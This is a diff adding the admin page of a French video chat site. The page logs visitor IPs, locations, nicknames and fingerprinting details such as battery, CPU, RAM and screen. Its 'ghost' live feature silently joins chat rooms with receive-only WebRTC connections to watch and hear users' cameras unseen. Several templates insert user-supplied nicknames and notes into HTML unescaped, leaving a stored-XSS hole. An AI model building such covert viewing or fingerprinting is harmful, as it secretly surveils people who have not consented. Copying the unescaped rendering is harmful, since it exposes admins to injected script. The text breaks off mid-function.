@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin - Stats & Contrôle</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <style>
+        :root {
+            --bg: #f0f0f0;
+            --card: #ffffff;
+            --primary: #007cba;
+            --text: #333333;
+            --text-dim: #666666;
+            --danger: #e74c3c;
+            --success: #28a745;
+            --warning: #f39c12;
+            --border: #cccccc;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: monospace;
+            background: var(--bg);
+            color: var(--text);
+            padding: 14px;
+            font-size: 13px;
+        }
+
+        /* Login Overlay */
+        #loginOverlay {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .login-card {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .login-card h2 { margin-bottom: 20px; font-weight: bold; }
+        input[type="password"], input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid var(--border);
+            border-radius: 5px;
+            font-family: monospace;
+        }
+
+        /* Main Dashboard */
+        h1 { margin: 0 0 10px; font-size: 17px; }
+        .stats-count { color: var(--text-dim); font-size: 13px; font-weight: normal; }
+
+        .config-panel {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 7px;
+            padding: 12px 16px;
+            margin-bottom: 11px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            align-items: center;
+        }
+        .config-group { display: flex; flex-direction: column; gap: 0.2rem; }
+        .config-label { font-size: 11px; font-weight: bold; color: #555; text-transform: uppercase; }
+        .row { display: flex; gap: 0.5rem; align-items: center; }
+
+        /* Buttons matching original */
+        .btn { border: none; padding: 6px 12px; font-size: 12px; cursor: pointer; border-radius: 4px; font-weight: bold; transition: opacity 0.2s; }
+        .btn:hover { opacity: 0.8; }
+        #clearLogsBtn { background: #e74c3c; color: white; }
+        #saveNotesBtn { background: #28a745; color: white; }
+        #deleteSelectedBtn { background: #e67e22; color: white; }
+        #saveRedirBtn { background: #007cba; color: white; }
+
+        /* Table CSS matching PHP */
+        .table-container {
+            width: 100%;
+            overflow-x: auto;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+        }
+        th, td {
+            border: 1px solid #ccc;
+            padding: 4px 7px;
+            text-align: left;
+            vertical-align: middle;
+        }
+        th {
+            background: #007cba;
+            color: white;
+            white-space: nowrap;
+            font-size: 12px;
+            text-align: center;
+        }
+
+        .lettre-big { color: #007cba; font-size: 19px; font-weight: bold; text-align: center; }
+        .count { font-size: 11px; color: #888; display: block; }
+        .ip-cell { font-size: 11px; color: #555; word-break: break-all; }
+        .pseudo { color: #333; font-size: 12px; }
+        .vpn-badge { color: #c0392b; font-weight: bold; text-align: center; }
+
+        /* Extras columns */
+        .extra { display: none; font-size: 11px; color: #444; text-align: center; }
+        .show-extras .extra { display: table-cell; }
+
+        .bat-low { color: #e74c3c; font-weight: bold; }
+        .bat-ok { color: #27ae60; font-weight: bold; }
+
+        .blocked-row td { background: #fff0f0 !important; }
+        .white-row td { background: #f0fff4 !important; }
+
+        .note-input { width: 100px; border: 1px solid #ddd; padding: 3px 5px; font-size: 12px; border-radius: 3px; font-family: monospace; }
+        
+        .cb-block { accent-color: #e74c3c; width: 17px; height: 17px; cursor: pointer; }
+        .cb-white { accent-color: #28a745; width: 17px; height: 17px; cursor: pointer; }
+        .cb-sel { width: 14px; height: 14px; cursor: pointer; }
+
+        .actions-top { margin: 7px 0; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+        
+        .loading { text-align: center; padding: 2rem; color: var(--text-dim); }
+
+
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            .header h1 { font-size: 1.4rem; }
+        }
+    </style>
+    <style>
+        /* Profile Modal */
+        #profileModal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.6);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+        }
+        #profileModal.open { display: flex; }
+        .modal-card {
+            background: white;
+            border-radius: 10px;
+            padding: 24px;
+            width: 420px;
+            max-width: 95vw;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            position: relative;
+        }
+        .modal-close {
+            position: absolute;
+            top: 12px; right: 16px;
+            font-size: 20px;
+            cursor: pointer;
+            color: #666;
+            background: none;
+            border: none;
+        }
+        .modal-title {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            color: #007cba;
+            border-bottom: 2px solid #007cba;
+            padding-bottom: 8px;
+        }
+        .modal-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px 16px;
+        }
+        .modal-item label {
+            font-size: 10px;
+            color: #888;
+            text-transform: uppercase;
+            display: block;
+        }
+        .modal-item span {
+            font-size: 13px;
+            font-weight: bold;
+            color: #333;
+        }
+        .modal-pseudos {
+            margin-top: 12px;
+            padding: 8px;
+            background: #f5f5f5;
+            border-radius: 6px;
+        }
+        .modal-pseudos label {
+            font-size: 10px;
+            color: #888;
+            text-transform: uppercase;
+        }
+        .modal-pseudos .names {
+            margin-top: 4px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+        .pseudo-tag {
+            background: #007cba;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+        }
+        .modal-rooms {
+            margin-top: 8px;
+            font-size: 11px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loginOverlay">
+        <div class="login-card">
+            <h2>Accès Protégé</h2>
+            <input type="password" id="passInput" placeholder="Mot de passe admin">
+            <button class="btn" id="loginBtn">Se connecter</button>
+
+            <p id="loginError" style="color:var(--danger); margin-top:1rem; display:none;">Mot de passe incorrect</p>
+        </div>
+    </div>
+
+    <div id="dashboard" style="display:none;">
+        <h1>📊 Stats chaltet.com <small class="stats-count">— <span id="logCount">0</span> entrées · <span id="ipCount">0</span> IPs</small></h1>
+
+        <!-- Tab Nav -->
+        <div style="display:flex;gap:8px;margin-bottom:14px;border-bottom:2px solid var(--border);padding-bottom:8px;">
+            <button class="btn tab-btn active" id="tab-stats">📊 Stats</button>
+            <button class="btn tab-btn" id="tab-live" style="background:var(--danger)">🔴 Live</button>
+        </div>
+
+        <!-- Live Panel -->
+        <div id="livePanel" style="display:none;">
+            <div style="display:flex;gap:10px;align-items:center;margin-bottom:12px;">
+                <span style="font-weight:bold">Salons actifs</span>
+                <button class="btn" id="refreshRoomsBtn" style="font-size:11px;padding:4px 10px">↻ Rafraîchir</button>
+            </div>
+            <div id="roomsList" style="display:flex;flex-direction:column;gap:10px;"></div>
+
+            <!-- Ghost Video Viewer -->
+            <div id="ghostViewer" style="display:none;margin-top:20px;">
+                <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+                    <strong id="ghostRoomLabel">👁 Salon : </strong>
+                    <button class="btn" id="ghostLeaveBtn" style="background:var(--danger);font-size:11px;padding:4px 10px">Quitter</button>
+                </div>
+                <div id="ghostVideos" style="display:flex;flex-wrap:wrap;gap:10px;"></div>
+            </div>
+        </div>
+
+        <div id="statsPanel">
+        <div class="config-panel">
+            <div class="config-group">
+                <span class="config-label">↪ Rediriger les bloqués vers</span>
+                <div class="row">
+                    <input type="text" id="redirInput" placeholder="https://google.com (vide = retour)" style="width:260px; margin:0">
+                    <button class="btn" id="saveRedirBtn" style="width:100px">✓ Valider</button>
+                </div>
+            </div>
+
+            <div class="config-group">
+                <span class="config-label">🛡️ Mode Liste Blanche</span>
+                <div class="row">
+                    <button class="btn" id="wlToggleBtn" style="background:var(--warning)">OFF - Normal</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="actions-top">
+            <button class="btn" id="saveNotesBtn">💾 Sauver notes</button>
+            <button class="btn" id="deleteSelectedBtn">🗑️ Supprimer sélection</button>
+            <button class="btn" id="clearLogsBtn" style="background:#555">Tout Effacer</button>
+            <label style="background:#555;color:white;padding:6px 11px;border-radius:4px;cursor:pointer;font-size:12px;font-weight:bold;user-select:none">
+                <input type="checkbox" id="toggleExtra" style="margin-right:4px">🔍 Infos détaillées
+            </label>
+            <button class="btn" id="refreshBtn" style="background:var(--card); color:var(--text); border:1px solid #ccc; margin-left:auto">Rafraîchir</button>
+            <input type="text" id="searchInput" placeholder="Filtrer..." style="margin:0; width:200px;">
+        </div>
+
+
+
+        <div class="table-container">
+            <table id="logsTable">
+                <thead>
+                    <tr>
+                        <th><input type="checkbox" id="selectAll" class="cb-sel"></th>
+                        <th>Lettre</th>
+                        <th>IP</th>
+                        <th>Localisation</th>
+                        <th>Pseudo(s)</th>
+                        <th>Dernière co.</th>
+                        <th>Nav</th>
+                        <th>VPN</th>
+                        <th class="extra">🔋</th>
+                        <th class="extra">⚡</th>
+                        <th class="extra">Écran</th>
+                        <th class="extra">Lang</th>
+                        <th class="extra">TZ</th>
+                        <th class="extra">CPU</th>
+                        <th class="extra">RAM</th>
+                        <th class="extra">📶</th>
+                        <th class="extra">👆</th>
+                        <th class="extra">OS</th>
+                        <th class="extra">🎨</th>
+                        <th style="text-align:left">Note</th>
+                        <th>🚫</th>
+                        <th>✅</th>
+                    </tr>
+                </thead>
+                <tbody id="logsBody">
+                    <tr><td colspan="22" class="loading">Chargement...</td></tr>
+                </tbody>
+            </table>
+        </div>
+        </div><!-- end statsPanel -->
+
+    </div>
+
+    <!-- Profile Modal -->
+    <div id="profileModal">
+        <div class="modal-card">
+            <button class="modal-close" onclick="document.getElementById('profileModal').classList.remove('open')">✕</button>
+            <div class="modal-title" id="modal-title">Profil</div>
+            <div class="modal-grid" id="modal-grid"></div>
+            <div class="modal-pseudos">
+                <label>Pseudos utilisés</label>
+                <div class="names" id="modal-pseudos"></div>
+            </div>
+            <div class="modal-rooms" id="modal-rooms"></div>
+            <div style="margin-top:16px;">
+                <label style="font-size:10px;color:#888;text-transform:uppercase;">Lien personnalisé</label>
+                <div style="display:flex;gap:8px;margin-top:6px;">
+                    <input id="modal-room-input" type="text" placeholder="nom-du-salon" style="flex:1;padding:6px 10px;border:1px solid #ddd;border-radius:4px;font-size:12px;">
+                    <button onclick="generateShortLink()" style="padding:6px 12px;background:#007cba;color:white;border:none;border-radius:4px;cursor:pointer;font-size:12px;">Générer</button>
+                </div>
+                <div id="modal-short-link" style="margin-top:8px;font-size:12px;word-break:break-all;"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let sessionToken = sessionStorage.getItem('adminToken') || '';
+        let showExtras = false;
+        let lastData = null;
+
+        // Auto-login: si pas de token valide, faire le login automatiquement
+        (async function autoLogin() {
+            if (sessionToken) {
+                // Vérifier si le token existant est encore valide
+                const res = await fetch('/admin/api/data', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ token: sessionToken })
+                });
+                if (res.ok) {
+                    const d = await res.json();
+                    if (d.ok) {
+                        document.getElementById('loginOverlay').style.display = 'none';
+                        document.getElementById('dashboard').style.display = 'block';
+                        lastData = d;
+                        renderLogs();
+                        updateConfigUI(d.config);
+                        return;
+                    }
+                }
+                sessionStorage.removeItem('adminToken');
+                sessionToken = '';
+            }
+            // Pas de token valide — afficher le formulaire de login
+            document.getElementById('loginOverlay').style.display = 'flex';
+            document.getElementById('dashboard').style.display = 'none';
+        })();
+
+        async function login() {
+            const pass = document.getElementById('passInput').value;
+            const res = await fetch('/admin/api/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ password: pass })
+            });
+            const data = await res.json();
+            if (data.ok) {
+                sessionToken = data.token;
+                sessionStorage.setItem('adminToken', sessionToken);
+                document.getElementById('loginOverlay').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                loadData();
+            } else {
+                alert(data.message || 'Mot de passe incorrect');
+                document.getElementById('loginError').style.display = 'block';
+            }
+        }
+
+        async function loadData() {
+            const res = await fetch('/admin/api/data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: sessionToken })
+            });
+            const data = await res.json();
+            if (data.ok) {
+                lastData = data;
+                renderLogs();
+                updateConfigUI(data.config);
+            } else if (res.status === 401) {
+                sessionStorage.removeItem('adminToken');
+                location.reload();
+            }
+        }
+
+        function updateConfigUI(config) {
+            const btn = document.getElementById('wlToggleBtn');
+            btn.textContent = config.whitelist_mode ? 'ON - Liste Blanche' : 'OFF - Normal';
+            btn.style.background = config.whitelist_mode ? 'var(--success)' : 'var(--warning)';
+            document.getElementById('redirInput').value = config.redirect_url || '';
+        }
+
+        async function toggleWhitelistMode() {
+            const btn = document.getElementById('wlToggleBtn');
+            const current = btn.textContent.includes('ON');
+            await fetch('/admin/api/config', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: sessionToken, whitelist_mode: !current })
+            });
+            loadData();
+        }
+
+        async function saveRedir() {
+            const url = document.getElementById('redirInput').value;
+            await fetch('/admin/api/config', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: sessionToken, redirect_url: url })
+            });
+            alert('Sauvegardé');
+            loadData();
+        }
+
+        async function toggleStatus(ip, field, newValue) {
+            await fetch('/admin/api/toggle', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: sessionToken, ip, field, value: newValue })
+            });
+            loadData();
+        }
+
+        async function deleteAllLogs() {
+            if (confirm('Voulez-vous vraiment vider TOUT le fichier display.txt ?')) {
+                await fetch('/admin/api/delete', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ token: sessionToken, all: true })
+                });
+                loadData();
+            }
+        }
+
+        async function deleteSelected() {
+            const selected = Array.from(document.querySelectorAll('.line-cb:checked')).map(cb => {
+                return JSON.parse(cb.dataset.indices);
+            }).flat();
+            if (selected.length === 0) return alert('Aucune ligne sélectionnée');
+            const uniqueIps = new Set(Array.from(document.querySelectorAll('.line-cb:checked')).map(cb => cb.closest('tr').querySelector('.ip-cell').textContent.trim()));
+            if (!confirm(`Supprimer ${uniqueIps.size} IP(s) — ${selected.length} ligne(s) de logs ?`)) return;
+
+            const res = await fetch('/admin/api/delete-selected', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: sessionToken, indices: selected })
+            });
+            const data = await res.json();
+            if (!data.ok) {
+                alert('❌ Erreur : ' + (data.message || 'Suppression annulée'));
+            }
+            loadData();
+        }
+
+        async function saveNotes() {
+            const notes = {};
+            document.querySelectorAll('.note-input').forEach(input => {
+                notes[input.dataset.ip] = input.value;
+            });
+
+            const res = await fetch('/admin/api/save-notes', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: sessionToken, notes })
+            });
+            if (res.ok) alert('Notes sauvegardées ✓');
+            else alert('Erreur lors de la sauvegarde');
+        }
+
+        function toggleDetailed() {
+            showExtras = document.getElementById('toggleExtra').checked;
+            document.getElementById('logsTable').classList.toggle('show-extras', showExtras);
+        }
+
+
+        function renderLogs() {
+            if (!lastData) return;
+            const data = lastData;
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            const body = document.getElementById('logsBody');
+            // Garder toutes les lignes avec leurs vrais indices Redis
+            const allLines = data.logs ? data.logs.split('\n') : [];
+            
+            // Group by IP — indices = vrais indices dans allLines (pour delete correct)
+            const groups = {};
+            allLines.forEach((line, realIndex) => {
+                if (!line.includes('IP:')) return;
+                const m = line.match(/\[([^\]]+)\] IP: ([^\s|]+) \| ([^|]+) \| ([^(]+)\(([^)]+)\) \| ([^|]*) \| ([^|]*) \| ([^|]+) \| (.+)/);
+                if (!m) return;
+                const ip = m[2].trim();
+                const note = m[7].trim();
+                const browser = m[8].trim();
+                const room = m[9].trim();
+                if (!groups[ip]) groups[ip] = {
+                    ip, date: m[1].trim(), letter: m[3].trim(),
+                    city: m[4].trim(), country: m[5].trim(),
+                    vpn: m[6].includes('VPN'),
+                    browser, rooms: new Set(), count: 0, indices: []
+                };
+                groups[ip].count++;
+                if (room && room !== 'REDIRECT_CHECK') groups[ip].rooms.add(room);
+                groups[ip].indices.push(realIndex);
+                if (new Date(m[1]) > new Date(groups[ip].date)) {
+                    groups[ip].date = m[1].trim();
+                    groups[ip].browser = browser;
+                }
+            });
+
+            const sorted = Object.values(groups)
+                .filter(g => {
+                    const roomList = Array.from(g.rooms).join(' ');
+                    const extra = data.extras[g.ip] || {};
+                    const note = data.notes[g.ip] || '';
+                    const haystack = `${g.ip} ${g.city} ${g.country} ${g.letter} ${roomList} ${note} ${JSON.stringify(extra)}`.toLowerCase();
+                    return haystack.includes(searchTerm);
+                })
+                .sort((a,b) => new Date(b.date) - new Date(a.date));
+            
+            const ipLines = allLines.filter(l => l.includes('IP:'));
+            document.getElementById('logCount').textContent = ipLines.length;
+            document.getElementById('ipCount').textContent = sorted.length;
+
+            body.innerHTML = sorted.map(g => {
+                const rule = data.blacklist.find(r => r.ip === g.ip) || { blocked: false, whitelist: false };
+                const extra = data.extras[g.ip] || {};
+                const note = data.notes[g.ip] || '';
+                const rowClass = rule.blocked ? 'blocked-row' : (rule.whitelist ? 'white-row' : '');
+                window._profileMap[g.ip] = { g, extra };
+                
+                return `<tr class="${rowClass}">
+                    <td style="text-align:center"><input type="checkbox" class="line-cb cb-sel" data-indices='${JSON.stringify(g.indices)}'></td>
+                    <td class="lettre-big profile-trigger" data-ip="${g.ip}" style='cursor:pointer;'>${g.letter}${g.count > 1 ? `<span class="count">${g.count}x</span>` : ''}</td>
+                    <td class="ip-cell profile-trigger" data-ip="${g.ip}" style='cursor:pointer;text-decoration:underline;'>${g.ip}</td>
+                    <td>${g.city}<br><small style="color:#888">${g.country}</small></td>
+                    <td class="pseudo">${(() => { const all = extra.pseudos ? extra.pseudos.split(', ').filter(Boolean) : []; const last3 = all.slice(-3); const rest = all.length - 3; return last3.length ? last3.map(p => `<div><span style='display:inline-block;width:8px;height:8px;border-radius:50%;background:${extra.url_color||'#888'};margin-right:4px;vertical-align:middle;'></span>${p}</div>`).join('') + (rest > 0 ? `<div style='color:#888;font-size:10px'>+${rest} autres</div>` : '') : '<span style="color:#555;font-size:11px">—</span>'; })()}</td>
+                    <td style="font-size:11px; white-space:nowrap;">${g.date}</td>
+                    <td style="text-align:center">${g.browser}</td>
+                    <td class="vpn-badge">${g.vpn ? '🔒' : ''}</td>
+                    
+                    <td class="extra ${((parseInt(extra.battery_level) || 100) <= 20) ? 'bat-low' : 'bat-ok'}">${extra.battery_level || 'N/A'}</td>
+                    <td class="extra">${extra.battery_charging || 'N/A'}</td>
+                    <td class="extra">${extra.screen || 'N/A'}</td>
+                    <td class="extra">${extra.lang || 'N/A'}</td>
+                    <td class="extra">${(extra.timezone || 'N/A').split('/').pop()}</td>
+                    <td class="extra">${extra.cores || 'N/A'}</td>
+                    <td class="extra">${extra.ram || 'N/A'}</td>
+                    <td class="extra">${extra.connection || 'N/A'}</td>
+                    <td class="extra">${extra.touch || 'N/A'}</td>
+                    <td class="extra" style="font-size:9px">${extra.platform || 'N/A'}</td>
+                    <td class="extra">${extra.darkmode || 'N/A'}</td>
+                    
+                    <td><input type="text" class="note-input" data-ip="${g.ip}" value="${note}"></td>
+                    <td style="text-align:center">
+                        <input type="checkbox" class="cb-block" ${rule.blocked ? 'checked' : ''} data-ip="${g.ip}" data-field="blocked">
+                    </td>
+                    <td style="text-align:center">
+                        <input type="checkbox" class="cb-white" ${rule.whitelist ? 'checked' : ''} data-ip="${g.ip}" data-field="whitelist">
+                    </td>
+                </tr>`;
+            }).join('');
+        }
+
+        // Event listeners
+        document.getElementById('loginBtn').addEventListener('click', login);
+        document.getElementById('passInput').addEventListener('keypress', (e) => { if(e.key === 'Enter') login(); });
+        document.getElementById('clearLogsBtn').addEventListener('click', deleteAllLogs);
+        document.getElementById('deleteSelectedBtn').addEventListener('click', deleteSelected);
+        document.getElementById('saveNotesBtn').addEventListener('click', saveNotes);
+        document.getElementById('wlToggleBtn').addEventListener('click', toggleWhitelistMode);
+        document.getElementById('saveRedirBtn').addEventListener('click', saveRedir);
+        document.getElementById('toggleExtra').addEventListener('change', toggleDetailed);
+        document.getElementById('refreshBtn').addEventListener('click', loadData);
+        // Auto-refresh toutes les 30s
+        setInterval(loadData, 30000);
+        document.getElementById('searchInput').addEventListener('input', renderLogs);
+        document.getElementById('selectAll').addEventListener('change', (e) => {
+            document.querySelectorAll('.line-cb').forEach(cb => cb.checked = e.target.checked);
+        });
+
+        let _currentProfile = {};
+
+        async function generateShortLink() {
+            const room = document.getElementById('modal-room-input').value.trim();
+            if (!room) return;
+            const { g, extra } = _currentProfile;
+            const pseudo = (extra && extra.url_pseudo) || '';
+            const color = (extra && extra.url_color) ? extra.url_color.replace('#', '') : '';
+            let url = 'https://chaltet.com/' + room;
+            if (pseudo) url += '?pseudo=' + encodeURIComponent(pseudo);
+            if (color) url += (pseudo ? '&' : '?') + 'color=' + color;
+            
+            const res = await fetch('/api/shorten', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ url })
+            });
+            const data = await res.json();
+            if (data.ok) {
+                const el = document.getElementById('modal-short-link');
+                el.innerHTML = '<a href="' + data.short + '" target="_blank">' + data.short + '</a> <button id="copyButton" style="font-size:11px;padding:2px 6px;cursor:pointer;">Copier</button>';
+                
+                // Add click event listener to avoid CSP issues
+                const copyBtn = document.getElementById('copyButton');
+                copyBtn.addEventListener('click', () => {
+                    navigator.clipboard.writeText(data.short);
+                });
+            }
+        }
+
+        function openProfile(g, extra) {
+            const modal = document.getElementById('profileModal');
+            document.getElementById('modal-title').textContent = 'Profil — ' + g.letter + ' (' + g.ip + ')';
+            
+            const fields = [
+                ['IP', g.ip],
+                ['Navigateur', g.browser],
+                ['Localisation', g.city + ', ' + g.country],
+                ['VPN', g.vpn ? '🔒 Oui' : 'Non'],
+                ['Écran', extra.screen || 'N/A'],
+                ['Langue', extra.lang || 'N/A'],
+                ['Fuseau', (extra.timezone || 'N/A').split('/').pop()],
+                ['CPU', extra.cores ? extra.cores + ' cœurs' : 'N/A'],
+                ['RAM', extra.ram || 'N/A'],
+                ['Touch', extra.touch || 'N/A'],
+                ['Thème', extra.darkmode || 'N/A'],
+                ['Batterie', extra.battery_level ? extra.battery_level + (extra.battery_charging === '⚡ Oui' ? ' ⚡' : '') : 'N/A'],
+                ['Connexion', extra.connection || 'N/A'],
+                ['OS', extra.platform || 'N/A'],
+            ];
+            
+            document.getElementById('modal-grid').innerHTML = fields.map(([label, val]) =>
+                '<div class="modal-item"><label>' + label + '</label><span>' + val + '</span></div>'
+            ).join('');
+            
+            const pseudos = extra.pseudos ? extra.pseudos.split(', ').filter(Boolean) : [];
+            const pcolor = extra.url_color || '';
+            document.getElementById('modal-pseudos').innerHTML = pseudos.length
+                ? pseudos.map(p => '<span class="pseudo-tag" style="' + (pcolor ? 'background:' + pcolor + ';' : '') + '">' + p + '</span>').join('')
+                : '<span style="color:#aaa;font-size:12px">Aucun pseudo connu</span>';
+            
+            const rooms = Array.from(g.rooms);
+            document.getElementById('modal-rooms').innerHTML = rooms.length
+                ? '🚪 Salons visités : ' + rooms.map(r => '/' + r).join(', ')
+                : '';
+            
+            _currentProfile = { g, extra };
+            modal.classList.add('open');
+            document.getElementById('modal-short-link').innerHTML = '';
+        }
+
+        // Close modal on backdrop click
+        document.getElementById('profileModal').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('profileModal'))
+                document.getElementById('profileModal').classList.remove('open');
+        });
+
+        // Store profile data for modal
+        window._profileMap = {};
+
+        document.getElementById('logsBody').addEventListener('click', (e) => {
+            if (e.target.classList.contains('cb-block') || e.target.classList.contains('cb-white')) {
+                const { ip, field } = e.target.dataset;
+                const value = e.target.checked; // true = coché = bloquer/whitelister
+                toggleStatus(ip, field, value);
+            }
+            const trigger = e.target.closest('.profile-trigger');
+            if (trigger) {
+                const ip = trigger.dataset.ip;
+                if (window._profileMap[ip]) {
+                    const { g, extra } = window._profileMap[ip];
+                    openProfile(g, extra);
+                }
+            }
+        });
+        document.getElementById('tab-stats').addEventListener('click', () => switchTab('stats'));
+        document.getElementById('tab-live').addEventListener('click', () => switchTab('live'));
+
+        // ── Tab switching ──────────────────────────────────────────────────
+        function switchTab(tab) {
+            document.getElementById('statsPanel').style.display = tab === 'stats' ? '' : 'none';
+            document.getElementById('livePanel').style.display = tab === 'live' ? '' : 'none';
+            document.getElementById('tab-stats').classList.toggle('active', tab === 'stats');
+            document.getElementById('tab-live').classList.toggle('active', tab === 'live');
+            if (tab === 'live') loadRooms();
+        }
+
+        // ── Live: fetch active rooms via Socket.IO admin ──────────────────
+        let ghostSocket = null;
+        let ghostPeers = {}; // peerId -> RTCPeerConnection
+        let ghostRoom = null;
+
+        async function loadRooms() {
+            const res = await fetch('/admin/api/rooms', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: sessionToken })
+            });
+            if (!res.ok) return;
+            const data = await res.json();
+            renderRooms(data.rooms || []);
+        }
+
+        function renderRooms(rooms) {
+            const el = document.getElementById('roomsList');
+            if (!rooms.length) { el.innerHTML = '<em style="color:var(--text-dim)">Aucun salon actif.</em>'; return; }
+            el.innerHTML = rooms.map(r => `
+                <div style="background:var(--card);border:1px solid var(--border);border-radius:6px;padding:10px 14px;display:flex;align-items:center;gap:12px;">
+                    <strong style="min-width:120px">/${r.room}</strong>
+                    <span style="color:var(--text-dim)">${r.count} peer${r.count>1?'s':''}</span>
+                    <span>${r.peers.map(p => `<span title="${p.id}" style="margin-right:6px">${p.cam ? '📷' : '🔇'} ${p.name}</span>`).join('')}</span>
+                    <button class="btn" onclick="ghostJoin('${r.room}')" style="margin-left:auto;font-size:11px;padding:4px 10px;background:var(--primary)">👁 Voir</button>
+                </div>
+            `).join('');
+        }
+
+        document.getElementById('refreshRoomsBtn').addEventListener('click', loadRooms);
+
+        // ── Ghost WebRTC connection ────────────────────────────────────────
+        function ghostJoin(roomId) {
+            if (ghostSocket) ghostLeave();
+
+            ghostRoom = roomId;
+            document.getElementById('ghostRoomLabel').textContent = '👁 Salon : ' + roomId;
+            document.getElementById('ghostViewer').style.display = '';
+            document.getElementById('ghostVideos').innerHTML = '<em style="color:var(--text-dim)">Connexion...</em>';
+
+            ghostSocket = io({ path: '/socket.io' });
+
+            ghostSocket.on('connect', () => {
+                ghostSocket.emit('ghost-join', { token: sessionToken, roomId });
+            });
+
+            ghostSocket.on('ghost-peers', (peers) => {
+                document.getElementById('ghostVideos').innerHTML = '';
+                if (!peers.length) {
+                    document.getElementById('ghostVideos').innerHTML = '<em style="color:var(--text-dim)">Aucun peer dans ce salon.</em>';
+                    return;
+                }
+                peers.forEach(p => createGhostPeer(p.id, p.displayName, true));
+            });
+
+            // When a new user joins while ghost is watching
+            ghostSocket.on('user-connected', (peerId) => {
+                createGhostPeer(peerId, 'Guest', true);
+            });
+
+            ghostSocket.on('user-disconnected', (peerId) => {
+                if (ghostPeers[peerId]) { ghostPeers[peerId].close(); delete ghostPeers[peerId]; }
+                const el = document.getElementById('ghost-peer-' + peerId);
+                if (el) el.remove();
+            });
+
+            ghostSocket.on('signal', async ({ from, signal }) => {
+                if (!ghostPeers[from]) return;
+                const pc = ghostPeers[from];
+                try {
+                    if (signal.type === 'offer') {
+                        await pc.setRemoteDescription(new RTCSessionDescription(signal));
+                        const answer = await pc.createAnswer();
+                        await pc.setLocalDescription(answer);
+                        ghostSocket.emit('signal', { to: from, signal: pc.localDescription });
+                    } else if (signal.type === 'answer') {
+                        await pc.setRemoteDescription(new RTCSessionDescription(signal));
+                    } else if (signal.candidate) {
+                        await pc.addIceCandidate(new RTCIceCandidate(signal));
+                    }
+                } catch(e) {}
+            });
+
+            ghostSocket.on('profile-update', ({ id, displayName }) => {
+                const label = document.querySelector(`#ghost-peer-${id} .ghost-label`);
+                if (label) label.textContent = displayName;
+            });
+        }
+
+        async function createGhostPeer(peerId, displayName, initiator) {
+            const iceRes = await fetch('/api/ice-servers');
+            const iceData = await iceRes.json();
+            const pc = new RTCPeerConnection({ iceServers: iceData.iceServers || [] });
+            ghostPeers[peerId] = pc;
+
+            // Ghost sends NO tracks — receive only
+            pc.addTransceiver('video', { direction: 'recvonly' });
+            pc.addTransceiver('audio', { direction: 'recvonly' });
+
+            pc.onicecandidate = ({ candidate }) => {
+                if (candidate) ghostSocket.emit('signal', { to: peerId, signal: candidate });
+            };
+
+            pc.ontrack = ({ streams, track }) => {
+                if (track.kind !== 'video') return;
+                let box = document.getElementById('ghost-peer-' + peerId);
+                if (!box) {
+                    box = document.createElement('div');
+                    box.id = 'ghost-peer-' + peerId;
+                    box.style.cssText = 'background:#000;border-radius:8px;overflow:hidden;position:relative;width:280px;';
+                    const vid = document.createElement('video');
+                    vid.autoplay = true; vid.playsInline = true; vid.muted = false;
+                    vid.style.cssText = 'width:100%;display:block;';
+                    const lbl = document.createElement('div');
+                    lbl.className = 'ghost-label';
+                    lbl.textContent = displayName;
+                    lbl.style.cssText = 'position:absolute;bottom:6px;left:8px;color:#fff;font-size:12px;text-shadow:0 1px 3px #000';
+                    box.appendChild(vid); box.appendChild(lbl);
+                    document.getElementById('ghostVideos').appendChild(box);
+                }
+                const vid = box.querySelector('video');
+                if (streams && streams[0]) vid.srcObject = streams[0];
+            };
+
+            if (initiator) {
+                try {
+                    const offer = await pc.createOffer();
+                    await pc.setLocalDescription(offer);
